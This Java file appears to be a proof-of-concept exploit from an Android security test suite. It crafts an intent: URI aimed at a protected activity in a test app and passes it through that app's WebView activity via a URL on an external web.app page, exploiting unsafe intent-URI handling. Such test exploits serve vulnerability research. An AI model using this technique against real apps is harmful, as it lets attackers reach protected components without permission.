package sherlock.poc.unsafe_intent_uri.webview;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

public class BasicActivity extends AppCompatActivity {

    public static Intent newIntent(Context packageContext) {
        return new Intent(packageContext, BasicActivity.class);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent target = new Intent();
        target.setClassName("sherlock.test",
                "sherlock.test.protected_components.ProtectedActivity");

        String intentUri = target.toUri(Intent.URI_INTENT_SCHEME);

        Intent i = new Intent();
        i.setClassName("sherlock.test", "sherlock.test.unsafe_intent_uri.webview.BasicActivity");
        i.putExtra("url", "https://sherlock-93f40.web.app/?url=" + Uri.encode(intentUri));
        startActivity(i);
    }
}
